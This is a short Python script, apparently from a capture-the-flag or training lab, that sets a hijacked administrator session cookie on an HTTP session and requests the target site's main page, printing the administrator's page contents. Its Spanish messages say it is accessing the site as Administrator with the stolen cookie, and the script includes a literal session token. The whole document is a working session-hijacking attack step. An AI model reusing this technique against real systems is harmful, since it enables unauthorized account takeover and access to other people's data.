import requests

BASE_URL = "http://chatelaine.cylabacademy.net:11152"

admin_session = "bvfMumo_ICJN0Lsn9_CnNAZhhQi1rTdn6oSC0LOeZZk"

s = requests.Session()
s.cookies.set("session", admin_session)

print("[*] Accediendo como Administrador con la cookie secuestrada...")
r = s.get(f"{BASE_URL}/")
print(f"Status: {r.status_code}")
print("Contenido de la página del Administrador:")
print(r.text)
